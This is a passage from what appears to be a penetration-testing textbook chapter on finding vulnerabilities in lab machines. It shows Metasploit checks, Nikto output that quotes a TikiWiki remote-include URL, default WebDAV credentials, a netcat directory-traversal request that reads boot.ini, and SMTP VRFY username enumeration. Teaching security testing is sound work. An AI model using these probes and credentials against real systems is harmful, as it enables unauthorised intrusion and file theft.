[*] Verifying vulnerable status... (path: 0x0000005a)&#13;
[+] The target is vulnerable.❷&#13;
msf  exploit(ms08_067_netapi) &gt;</pre></div></div><p>When we run the vulnerability <code class="literal">check</code> ❶, Metasploit tells us that our Windows XP target is vulnerable to the MS08-067 vulnerability ❷, as expected.</p><p>Unfortunately, not all Metasploit modules have <code class="literal">check</code> functions. (If you try running <code class="literal">check</code> on a module that doesn’t support it, Metasploit will tell you.) For example, based on the results of our Nmap version scan in the previous chapter, the Windows XP target mail server appears to be out of date and subject to security issues. SLMail version 5.5.0.4433 has a known exploitable issue—CVE-2003-0264—so we can find it easily with a quick search in Msfconsole for <span class="emphasis"><em>cve:2003-0264</em></span>.</p><p><a class="indexterm" id="iddle2106"/><a class="indexterm" id="iddle2410"/><a class="indexterm" id="iddle2441"/>Once in the context of the module, we can test out <code class="literal">check</code>, as shown in <a class="xref" href="ch06.xhtml#slmail_module_has_no_check_functiondot" title="Example 6-9. The SLMail module has no check function.">Example 6-9</a>.</p><div class="example"><a id="slmail_module_has_no_check_functiondot"/><div class="example-title">Example 6-9. The SLMail module has no check function.</div><div class="example-contents"><pre class="programlisting">msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>set RHOST 192.168.20.10</strong></span>&#13;
rhost =&gt; 192.168.20.10&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>check</strong></span>&#13;
[*] This exploit does not support check.&#13;
msf  exploit(seattlelab_pass) &gt;</pre></div></div><p>As it turns out, this exploit module does not implement the <code class="literal">check</code> function, so we don’t have solid assurance that a service is vulnerable. Although our SLMail POP3 server appears to be vulnerable based on its banner version number, we can’t get confirmation from Metasploit. In cases like these, we may not be able to know for sure if a vulnerability exists short of running an exploit.</p></div><div class="sect1" title="Web Application Scanning"><div class="titlepage"><div><div><h2 class="title" id="web_application_scanning" style="clear: both">Web Application Scanning</h2></div></div></div><p>Although a client’s custom-built apps may have security problems, your target may also deploy prebuilt web applications such as payroll apps, webmail, and so on, which can be vulnerable to the same issues. If we can find an instance of known vulnerable software, we may be able to exploit it to get a foothold in a remote system.</p><p>Web application issues are particularly interesting on many external penetration tests where your attack surface may be limited to little more than web servers. For example, as you can see in <a class="xref" href="ch06.xhtml#default_apache_page" title="Figure 6-14. Default Apache page">Figure 6-14</a>, browsing to the default web page of the web server on our Linux target reveals a default Apache install page.</p><div class="figure"><a id="default_apache_page"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00079"/><img alt="Default Apache page" src="httpatomoreillycomsourcenostarchimages2030348.png.jpg"/></div></div><div class="figure-title">Figure 6-14. Default Apache page</div></div><p><a class="indexterm" id="iddle1834"/><a class="indexterm" id="iddle1865"/><a class="indexterm" id="iddle1869"/><a class="indexterm" id="iddle1934"/><a class="indexterm" id="iddle2413"/><a class="indexterm" id="iddle2533"/>Unless we can find a vulnerability in the underlying web server software, we’ll have a hard time exploiting a simple page that reads “It works!” Before we write this service off, though, let’s use a web scanner to look for additional pages that we might not see otherwise.</p><div class="sect2" title="Nikto"><div class="titlepage"><div><div><h3 class="title" id="nikto">Nikto</h3></div></div></div><p>Nikto is a web application vulnerability scanner built into Kali that’s like Nessus for web apps: It looks for issues such as dangerous files, outdated versions, and misconfigurations. To run Nikto against our Linux target, we tell it which host to scan with the <code class="literal">-h</code> flag, as shown in <a class="xref" href="ch06.xhtml#running_nikto" title="Example 6-10. Running Nikto">Example 6-10</a>.</p><div class="example"><a id="running_nikto"/><div class="example-title">Example 6-10. Running Nikto</div><div class="example-contents"><pre class="programlisting">root@kali:/# <span class="strong"><strong>nikto -h 192.168.20.11</strong></span>&#13;
- Nikto v2.1.5&#13;
---------------------------------------------------------------------------&#13;
+ Target IP:          192.168.20.11&#13;
+ Target Hostname:    192.168.20.11&#13;
+ Target Port:        80&#13;
+ Start Time:         2015-12-28 21:31:38 (GMT-5)&#13;
---------------------------------------------------------------------------&#13;
+ Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
+ OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&amp;h=1&amp;s=1&amp;min=1&amp;max=2&amp;f[]=x.tan.phpinfo()&amp;t=png&amp;title=http://cirt.net/rfiinc.txt?: TikiWiki contains a vulnerability which allows remote attackers to execute arbitrary PHP code. ❶&#13;
+ 6474 items checked: 2 error(s) and 7 item(s) reported on remote host&#13;
+ End Time:           2015-12-28 21:32:41 (GMT-5) (63 seconds)</pre></div></div><p>Manually browsing to the default installation path for every application with known vulnerabilities would be a daunting task, but fortunately, Nikto seeks out URLs that may not be apparent. One particularly interesting finding here is a vulnerable installation of the TikiWiki software ❶ on the server. Sure enough, if we browse to the TikiWiki directory at <span class="emphasis"><em><a class="ulink" href="http://192.168.20.11/tikiwiki/" target="_top">http://192.168.20.11/tikiwiki/</a></em></span>, we find the CMS software. Nikto thinks that this install is subject to a code execution vulnerability, and further analysis of Open Sourced Vulnerability Database (OSVDB) entry 40478 reveals that this issue has a Metasploit exploit that we can use during exploitation.</p><div class="note" title="Note"><h3 class="title"><a id="ch06note02"/>Note</h3><p>OSVDB (<span class="emphasis"><em><a class="ulink" href="http://osvdb.com/" target="_top">http://osvdb.com/</a></em></span>) is a vulnerability repository specifically for open source software such as TikiWiki, with detailed information on a wide variety of products. Use it to search for additional information about possible issues you find.</p></div></div><div class="sect2" title="Attacking XAMPP"><div class="titlepage"><div><div><h3 class="title" id="attacking_xampp">Attacking XAMPP</h3></div></div></div><p>Browsing to our Windows XP web server, we see at <span class="emphasis"><em>http://192.168.20.10/</em></span> that the default web page announces itself as XAMPP 1.7.2.</p><p>By default, XAMPP installations include phpMyAdmin, a database administration web application. Ideally, phpMyAdmin would not be available <a class="indexterm" id="iddle1157"/><a class="indexterm" id="iddle2446"/><a class="indexterm" id="iddle2534"/>over the network, or at least it should require credentials to access it. But on this version of XAMPP, the phpMyAdmin install at <span class="emphasis"><em><a class="ulink" href="http://192.168.20.10/phpmyadmin/" target="_top">http://192.168.20.10/phpmyadmin/</a></em></span> is available and open. Even worse, phpMyAdmin gives us root access on the same MySQL server that NSE told us we are unable to connect to. Using phpMyAdmin (as shown in <a class="xref" href="ch06.xhtml#open_phpmyadmin_console_complains_quite" title="Figure 6-15. The open phpMyAdmin console complains quite loudly about the poor configuration.">Figure 6-15</a>), we can bypass this restriction and perform MySQL queries on the server.</p><div class="figure"><a id="open_phpmyadmin_console_complains_quite"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00080"/><img alt="The open phpMyAdmin console complains quite loudly about the poor configuration." src="httpatomoreillycomsourcenostarchimages2030350.png.jpg"/></div></div><div class="figure-title">Figure 6-15. The open phpMyAdmin console complains quite loudly about the poor configuration.</div></div></div><div class="sect2" title="Default Credentials"><div class="titlepage"><div><div><h3 class="title" id="default_credentials">Default Credentials</h3></div></div></div><p>In addition to its inclusion of phpMyAdmin, a Google search tells us that XAMPP 1.7.3 and earlier come with Web Distributed Authoring and Versioning (WebDAV) software, which is used to manage files on a web server over HTTP. XAMPP’s WebDAV installation comes with the default username and password <span class="emphasis"><em>wampp:xampp</em></span>. If these values aren’t changed, anyone with access to WebDAV can log in, deface the website, and even possibly upload scripts that will allow attackers to get a foothold on the system through the web server. And, as you can see in <a class="xref" href="ch06.xhtml#webdav_install" title="Figure 6-16. WebDAV install">Figure 6-16</a>, WebDAV is indeed present on this server.</p><div class="figure"><a id="webdav_install"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00081"/><img alt="WebDAV install" src="httpatomoreillycomsourcenostarchimages2030352.png.jpg"/></div></div><div class="figure-title">Figure 6-16. WebDAV install</div></div><p>We can use the tool Cadaver to interact with WebDAV servers. In <a class="xref" href="ch06.xhtml#using_cadaver" title="Example 6-11. Using Cadaver">Example 6-11</a>, we use Cadaver to try to connect to the WebDAV server at <span class="emphasis"><em>http://192.168.20.10</em></span> and test the default credential set.</p><div class="example"><a id="using_cadaver"/><div class="example-title">Example 6-11. Using Cadaver</div><div class="example-contents"><pre class="programlisting">root@kali:/# <span class="strong"><strong>cadaver http://192.168.20.10/webdav</strong></span>&#13;
Authentication required for XAMPP with WebDAV on server `192.168.20.10':&#13;
Username: wampp&#13;
Password:&#13;
dav:/webdav/&gt; ❶</pre></div></div><p><a class="indexterm" id="iddle1211"/><a class="indexterm" id="iddle1964"/><a class="indexterm" id="iddle2407"/>The Cadaver login is successful ❶. Our Windows XP target uses the default credentials for WebDAV, which we will be able to exploit. Now that we have access to WebDAV, we can upload files to the web server.</p></div></div><div class="sect1" title="Manual Analysis"><div class="titlepage"><div><div><h2 class="title" id="manual_analysis" style="clear: both">Manual Analysis</h2></div></div></div><p>Sometimes, no solution will work nearly as well as manual vulnerability analysis to see if a service will lead to a compromise, and there’s no better way to improve than practice. In the sections that follow we’ll explore some promising leads from our port and vulnerability scanning.</p><div class="sect2" title="Exploring a Strange Port"><div class="titlepage"><div><div><h3 class="title" id="exploring_a_strange_port">Exploring a Strange Port</h3></div></div></div><p>One port that has failed to come up in our automated scans is 3232 on our Windows target. If you try scanning this port with an Nmap version scan (as we did at the end of <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a>), you’ll notice that it crashes. This behavior suggests that the listening program is designed to listen for a particular input and that it has difficulty processing anything else.</p><p>This sort of behavior is interesting to pentesters, because programs that crash when handling malformed input aren’t validating input properly. Recall from <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a> that in the process of crashing the program, the output led us to believe that the software is a web server. Connecting to the port with a browser, as shown in <a class="xref" href="ch06.xhtml#web_server_on_port_3232" title="Figure 6-17. Web server on port 3232">Figure 6-17</a>, confirms this.</p><div class="figure"><a id="web_server_on_port_3232"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00082"/><img alt="Web server on port 3232" src="httpatomoreillycomsourcenostarchimages2030354.png.jpg"/></div></div><div class="figure-title">Figure 6-17. Web server on port 3232</div></div><p>The web page served doesn’t tell us much, but from here we can connect to the port manually using Netcat. We know this is a web server, so we will talk to it as such. We know we can browse to the default web page, so we can enter <span class="strong"><strong><code class="literal">GET / HTTP/1.1</code></strong></span> to ask the web server for the default page (see <a class="xref" href="ch06.xhtml#connecting_to_a_port_with_netcat" title="Example 6-12. Connecting to a port with Netcat">Example 6-12</a>).</p><div class="example"><a id="connecting_to_a_port_with_netcat"/><div class="example-title">Example 6-12. Connecting to a port with Netcat</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.10 3232</strong></span>&#13;
<span class="strong"><strong>GET / HTTP/1.1</strong></span>&#13;
HTTP/1.1 200 OK&#13;
Server: Zervit 0.4 ❶&#13;
X-Powered-By: Carbono&#13;
Connection: close&#13;
Accept-Ranges: bytes&#13;
Content-Type: text/html&#13;
Content-Length: 36&#13;
&#13;
&lt;html&gt;&#13;
&lt;body&gt;&#13;
hi&#13;
&lt;/body&gt;&#13;
&lt;/html&gt;root@bt:~#</pre></div></div><p><a class="indexterm" id="iddle1813"/><a class="indexterm" id="iddle1965"/>The server announces itself as Zervit 0.4 ❶. It doesn’t look good for the software because the first autocomplete entry in a search for Zervit 0.4 on Google is “Zervit 0.4 exploit.” This web server software is subject to multiple security issues, including a buffer overflow and a local file inclusion vulnerability, which allows us to serve other files on the system. This service is so sensitive that it may be best to avoid buffer overflow attacks, because one false move will crash it. The local file inclusion, on the other hand, looks promising. We know the server can process HTTP <code class="literal">GET</code> requests. For example, we can download Windows XP’s <span class="emphasis"><em>boot.ini</em></span> file by moving back five directories to the C drive using <code class="literal">GET</code>, as shown in <a class="xref" href="ch06.xhtml#local_file_inclusion_in_zervit_0dot4" title="Example 6-13. Local file inclusion in Zervit 0.4">Example 6-13</a>.</p><div class="example"><a id="local_file_inclusion_in_zervit_0dot4"/><div class="example-title">Example 6-13. Local file inclusion in Zervit 0.4</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.10 3232</strong></span>&#13;
<span class="strong"><strong>GET /../../../../../boot.ini HTTP/1.1</strong></span>&#13;
HTTP/1.1 200 OK&#13;
Server: Zervit 0.4&#13;
X-Powered-By: Carbono&#13;
Connection: close&#13;
Accept-Ranges: bytes&#13;
Content-Type: application/octet-stream&#13;
Content-Length: 211&#13;
&#13;
[boot loader]&#13;
timeout=30&#13;
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS&#13;
[operating systems]&#13;
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Home Edition" /fastdetect /NoExecute=OptIn</pre></div></div><p>We’re able to pull down <span class="emphasis"><em>boot.ini</em></span>, a config file that tells Windows which operating system options to display at boot time. We’ll use this local file inclusion to pull down additional sensitive files in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>.</p></div><div class="sect2" title="Finding Valid Usernames"><div class="titlepage"><div><div><h3 class="title" id="finding_valid_usernames">Finding Valid Usernames</h3></div></div></div><p><a class="indexterm" id="iddle1410"/><a class="indexterm" id="iddle1656"/><a class="indexterm" id="iddle2347"/><a class="indexterm" id="iddle2401"/>We can drastically increase our chances of a successful password attack if we know valid usernames for services. (We’ll explore this in more detail in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>.) One way to find valid usernames for mail servers is to use the <code class="literal">VRFY SMTP</code> command, if it is available. As the name implies, <code class="literal">VRFY</code> verifies if a user exists. NSE found the <code class="literal">VRFY</code> verb is enabled on the Windows XP target in the previous chapter. Connect to TCP port 25 using Netcat, and use <code class="literal">VRFY</code> to check for usernames, as shown in <a class="xref" href="ch06.xhtml#using_the_smtp_vrfy_command" title="Example 6-14. Using the SMTP VRFY command">Example 6-14</a>.</p><div class="example"><a id="using_the_smtp_vrfy_command"/><div class="example-title">Example 6-14. Using the <code class="literal">SMTP VRFY</code> command</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.10 25</strong></span>&#13;
220 georgia.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here&#13;
<span class="strong"><strong>VRFY georgia</strong></span>&#13;
250 Georgia&lt;georgia@&gt;&#13;
<span class="strong"><strong>VRFY john</strong></span>&#13;
551 User not local</pre></div></div><p>Using <code class="literal">VRFY</code> we see that <span class="emphasis"><em>georgia</em></span> is a valid username, but there is no user called <span class="emphasis"><em>john</em></span>. We will look at using valid usernames to try to guess passwords in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>.</p></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00021" style="clear: both">Summary</h2></div></div></div><p>In this chapter, we have touched on various methods to find exploitable vulnerabilities on our targets. Using a variety of tools and techniques, we were able to find myriad ways to go after our targets, including our trusty MS08-067 exploit against our Windows XP SMB server and a local file inclusion vulnerability on the Zervit 0.4 web server that will allow us to download system files. Using <code class="literal">VRFY</code>, we found a valid username that we can use in password-guessing attacks on the mail server.</p><p>We learned that the SLMail server may have a vulnerability in the POP3 service based on its reported version number (though we were not able to find out for sure), and we found an open phpMyAdmin install on the web server that gives us root access to the underlying database, as well as an XAMPP install with default credentials for WebDAV that will allow us to upload files to the web server. On the Linux target, we found an NFS share with write access that allows us to write to a user’s <span class="emphasis"><em>.ssh</em></span> directory, and we discovered a not-readily-apparent TikiWiki install on the web server that appears to contain a code execution vulnerability. The Vsftpd 2.3.4 FTP server may have a hidden backdoor due to a compromise of the Vsftpd repositories.</p><p>At this point in the book we can see that our Windows XP and Linux target machines suffer from a lot of issues. The lack of attack surface on our Windows 7 target makes it seem pretty safe, but as we will see a bit later, that solid exterior hides a few holes underneath. Before we move on to exploiting these vulnerabilities, the next chapter will look at capturing traffic to gain sensitive information such as login credentials.</p></div></section></body></html>